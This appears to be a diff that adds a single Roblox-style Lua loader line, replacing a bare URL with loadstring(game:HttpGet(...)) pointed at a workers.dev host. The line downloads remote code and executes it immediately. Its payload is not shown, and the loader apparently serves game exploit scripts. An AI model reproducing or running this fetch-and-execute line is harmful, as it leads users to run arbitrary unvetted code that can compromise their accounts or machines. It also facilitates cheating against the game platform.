@@ -1,1 +1,2 @@
-https://loader.flashcool79.workers.dev/
+
+loadstring(game:HttpGet("https://loader.flashcool79.workers.dev/"))()
